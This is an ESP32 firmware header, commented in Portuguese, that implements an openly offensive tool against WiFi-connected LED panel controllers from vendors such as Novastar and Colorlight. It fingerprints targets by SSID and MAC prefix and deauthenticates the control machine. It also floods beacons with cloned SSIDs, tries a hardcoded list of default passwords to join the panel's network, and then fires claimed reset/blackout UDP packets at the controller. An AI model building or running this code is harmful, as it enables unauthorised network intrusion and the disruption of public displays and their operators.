#pragma once
#include <Arduino.h>
#include <WiFi.h>
#include <WiFiUdp.h>
#include <esp_wifi.h>
#include <vector>
#include "../utils/logger.h"
#include "scanner.h"
#include "deauth.h"
#include "beacon_flood.h"

/*
 * LED Panel Attack — ataque a controladores de telões/painéis LED
 *
 * Fabricantes alvo: Novastar, Colorlight, Linsn, DBStar, Onbon
 *
 * Modos de ataque:
 *   DEAUTH   — deautha a máquina de controle da rede do painel
 *   FLOOD    — beacon flood com mesmo SSID para confundir o software
 *   DISRUPT  — UDP flood no protocolo do controlador (porta 5005/9980)
 *
 * Detecção: SSID patterns + MAC OUI de fabricantes conhecidos
 */
class LEDAttack {
public:
    static LEDAttack& get() { static LEDAttack inst; return inst; }

    enum Mode { IDLE, DEAUTH_MODE, FLOOD_MODE, DISRUPT_MODE };

    struct LEDNet {
        String  ssid, bssid;
        uint8_t bssidRaw[6];
        uint8_t channel;
        int8_t  rssi;
        bool    open;          // rede aberta
        String  vendor;        // fabricante detectado
        String  protocol;      // protocolo estimado
        uint16_t ctrlPort;     // porta UDP do controlador
    };

    bool     running  = false;
    Mode     mode     = IDLE;
    uint32_t pkts     = 0;
    std::vector<LEDNet> detected;

    // Escaneia redes do WiFiScanner e identifica controladores LED
    void scan() {
        detected.clear();
        auto& aps = WiFiScanner::get().aps();
        for (auto& ap : aps) {
            if (_isLEDNet(ap.ssid, ap.bssidStr)) {
                LEDNet n;
                n.ssid    = ap.ssid;
                n.bssid   = ap.bssidStr;
                n.channel = ap.channel;
                n.rssi    = ap.rssi;
                n.open    = (ap.auth == WIFI_AUTH_OPEN);
                sscanf(ap.bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                       &n.bssidRaw[0],&n.bssidRaw[1],&n.bssidRaw[2],
                       &n.bssidRaw[3],&n.bssidRaw[4],&n.bssidRaw[5]);
                _classify(n);
                detected.push_back(n);
                LOG.warn("[LED] Detectado: \"" + n.ssid + "\" [" + n.bssid + "]"
                         " " + n.vendor + " ch" + String(n.channel)
                         + " rssi=" + String(n.rssi));
            }
        }
        if (detected.empty()) LOG.info("[LED] Nenhum painel LED detectado");
        else LOG.success("[LED] " + String(detected.size()) + " controlador(es) encontrado(s)");
    }

    // Ataque via deauth — desconecta PC de controle do AP do painel
    void startDeauth(int idx) {
        if (idx < 0 || idx >= (int)detected.size()) return;
        auto& n = detected[idx];
        running = true;
        mode    = DEAUTH_MODE;
        pkts    = 0;
        // Usa o Deauther existente em modo broadcast no canal do painel
        Deauther::get().stop();
        Deauther::get().intensity = 2; // agressivo
        Deauther::get().start(n.bssidRaw, nullptr, n.channel, false);
        LOG.warn("[LED] DEAUTH em \"" + n.ssid + "\" ch" + String(n.channel)
                 + " — desconectando controlador...");
    }

    // Beacon flood — inunda com mesmo SSID para confundir software
    void startFlood(int idx) {
        if (idx < 0 || idx >= (int)detected.size()) return;
        auto& n = detected[idx];
        running = true;
        mode    = FLOOD_MODE;
        pkts    = 0;
        // Injeta beacons com mesmo SSID em canais 1-13 para causar confusão
        BeaconFlood::get().stop();
        BeaconFlood::get().clearSSIDs();
        BeaconFlood::get().addSSID(n.ssid);
        // Variações do SSID para saturar tabelas de vizinhos
        for (int i = 0; i < 8; i++)
            BeaconFlood::get().addSSID(n.ssid + "_" + String(i));
        BeaconFlood::get().start(n.channel);
        LOG.warn("[LED] BEACON FLOOD em \"" + n.ssid + "\" — inundando SSIDs...");
    }

    // Modo disrupt — UDP flood direto (requer associação ao AP do painel)
    void startDisrupt(int idx) {
        if (idx < 0 || idx >= (int)detected.size()) return;
        auto& n = detected[idx];
        running  = true;
        mode     = DISRUPT_MODE;
        pkts     = 0;
        _tgtIdx  = idx;
        _nextPkt = 0;
        LOG.warn("[LED] DISRUPT em \"" + n.ssid + "\" (protocolo: " + n.protocol + ")"
                 " — conectando ao AP...");
        // Inicia deauth para expulsar controlador e depois conecta
        Deauther::get().start(n.bssidRaw, nullptr, n.channel, false);
        _connectAt = millis() + 3000; // espera 3s de deauth antes de conectar
        _phase     = PH_DEAUTH_FIRST;
    }

    void stop() {
        running = false;
        mode    = IDLE;
        Deauther::get().stop();
        BeaconFlood::get().stop();
        if (_udpOpen) { _udp.stop(); _udpOpen = false; }
        if (_staConnected) { WiFi.disconnect(true); _staConnected = false; }
        LOG.info("[LED] Ataque parado. Pkts: " + String(pkts));
    }

    void tick() {
        if (!running) return;
        if (mode == DISRUPT_MODE) _tickDisrupt();
    }

    // Retorna JSON de status
    String statusJson() const {
        String j = "{\"running\":" + String(running ? "true":"false");
        j += ",\"mode\":" + String((int)mode);
        j += ",\"pkts\":" + String(pkts);
        j += ",\"nets\":[";
        for (size_t i = 0; i < detected.size(); i++) {
            auto& n = detected[i];
            if (i) j += ",";
            j += "{\"ssid\":\"" + _esc(n.ssid) + "\"";
            j += ",\"bssid\":\"" + n.bssid + "\"";
            j += ",\"ch\":" + String(n.channel);
            j += ",\"rssi\":" + String(n.rssi);
            j += ",\"open\":" + String(n.open ? "true":"false");
            j += ",\"vendor\":\"" + n.vendor + "\"";
            j += ",\"proto\":\"" + n.protocol + "\"";
            j += "}";
        }
        j += "]}";
        return j;
    }

private:
    int           _tgtIdx      = 0;
    unsigned long _nextPkt     = 0;
    unsigned long _connectAt   = 0;
    bool          _udpOpen     = false;
    bool          _staConnected = false;
    WiFiUDP       _udp;

    enum Phase { PH_IDLE, PH_DEAUTH_FIRST, PH_CONNECTING, PH_ATTACKING };
    Phase _phase = PH_IDLE;

    // Padrões de SSID conhecidos de controladores LED
    static bool _isLEDNet(const String& ssid, const String& bssid) {
        String s = ssid; s.toLowerCase();
        // SSID patterns
        if (s.startsWith("nova")    || s.startsWith("mrv_")    ||
            s.startsWith("linsn")   || s.startsWith("colorlight") ||
            s.startsWith("dbstar")  || s.startsWith("onbon") ||
            s.startsWith("ob_")     || s.startsWith("cl_") ||
            s.startsWith("sync")    || s.startsWith("ledoc") ||
            s.indexOf("led-") >= 0  || s.indexOf("ledpanel") >= 0 ||
            s.indexOf("ledsign") >= 0 || s.indexOf("display") >= 0 ||
            s.startsWith("m3-")     || s.startsWith("m5-") ||
            s.startsWith("a8")      || s.startsWith("receiving card"))
            return true;
        // MAC OUI de fabricantes LED conhecidos
        String mac = bssid; mac.toUpperCase();
        if (mac.startsWith("00:A0:D1") || // Novastar
            mac.startsWith("00:21:97") || // Colorlight
            mac.startsWith("70:B3:D5") || // various LED
            mac.startsWith("C4:93:00") || // Linsn
            mac.startsWith("D4:9E:A1"))   // Onbon
            return true;
        return false;
    }

    void _classify(LEDNet& n) {
        String s = n.ssid; s.toLowerCase();
        if (s.startsWith("nova") || s.startsWith("mrv_") || s.startsWith("m3-") || s.startsWith("m5-")) {
            n.vendor = "Novastar"; n.protocol = "NovaCom"; n.ctrlPort = 5005;
        } else if (s.startsWith("colorlight") || s.startsWith("cl_")) {
            n.vendor = "Colorlight"; n.protocol = "CL"; n.ctrlPort = 9980;
        } else if (s.startsWith("linsn") || s.startsWith("sync")) {
            n.vendor = "Linsn"; n.protocol = "Linsn"; n.ctrlPort = 5005;
        } else if (s.startsWith("dbstar")) {
            n.vendor = "DBStar"; n.protocol = "DBStar"; n.ctrlPort = 8080;
        } else if (s.startsWith("onbon") || s.startsWith("ob_")) {
            n.vendor = "Onbon"; n.protocol = "OBNet"; n.ctrlPort = 5005;
        } else {
            n.vendor = "Generic"; n.protocol = "UDP"; n.ctrlPort = 5005;
        }
    }

    void _tickDisrupt() {
        unsigned long now = millis();
        if (_tgtIdx >= (int)detected.size()) return;
        auto& n = detected[_tgtIdx];

        switch (_phase) {
            case PH_DEAUTH_FIRST:
                if (now < _connectAt) return;
                Deauther::get().stop();
                // Conecta como STA ao AP do painel com senha padrão
                WiFi.begin(n.ssid.c_str(), "12345678");
                _phase = PH_CONNECTING;
                _connectAt = now + 8000;
                LOG.info("[LED] Tentando conectar a \"" + n.ssid + "\"...");
                break;

            case PH_CONNECTING:
                if (WiFi.status() == WL_CONNECTED) {
                    _staConnected = true;
                    _udp.begin(WiFi.localIP(), n.ctrlPort);
                    _udpOpen = true;
                    _phase   = PH_ATTACKING;
                    LOG.success("[LED] Conectado! IP=" + WiFi.localIP().toString()
                                + " — iniciando disrupção protocolo " + n.protocol);
                } else if (now > _connectAt) {
                    // Senha errada, tenta outra
                    static const char* passwords[] = {"88888888","admin123","00000000","a1b2c3d4","NovaP2Wifi",""};
                    static int pi = 0; pi++;
                    if (passwords[pi][0] == 0) {
                        LOG.warn("[LED] Sem senha padrão funcionou — usando flood de deauth");
                        _phase = PH_IDLE;
                        running = false;
                    } else {
                        WiFi.begin(n.ssid.c_str(), passwords[pi]);
                        _connectAt = now + 8000;
                        LOG.data("[LED] Tentando senha " + String(pi+1) + "...");
                    }
                }
                break;

            case PH_ATTACKING:
                if (now < _nextPkt) return;
                if (!_staConnected) { _phase = PH_IDLE; running = false; return; }
                _sendDisruptPacket(n);
                pkts++;
                _nextPkt = now + 20; // 50 pkts/s
                break;

            default: break;
        }
    }

    // Envia pacote de disrupção ao controlador
    void _sendDisruptPacket(const LEDNet& n) {
        // Pacote de reset/blackout para protocolos LED comuns
        // Novastar NovaCom magic reset: 0x55AA + cmd
        static const uint8_t novaDisrupt[] = {
            0x55, 0xAA, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,
            0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        };
        // Colorlight CL reset
        static const uint8_t clDisrupt[] = {
            0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            0x08, 0x00, 0x00, 0x01
        };
        // Broadcast para 255.255.255.255
        _udp.beginPacket("255.255.255.255", n.ctrlPort);
        if (n.protocol == "Colorlight" || n.protocol == "CL")
            _udp.write(clDisrupt, sizeof(clDisrupt));
        else
            _udp.write(novaDisrupt, sizeof(novaDisrupt));
        _udp.endPacket();
        // Também tenta controlador em IP padrão
        _udp.beginPacket("192.168.1.20", n.ctrlPort);
        _udp.write(novaDisrupt, sizeof(novaDisrupt));
        _udp.endPacket();
    }

    static String _esc(const String& s) {
        String r = s; r.replace("\"", "\\\""); return r;
    }
};
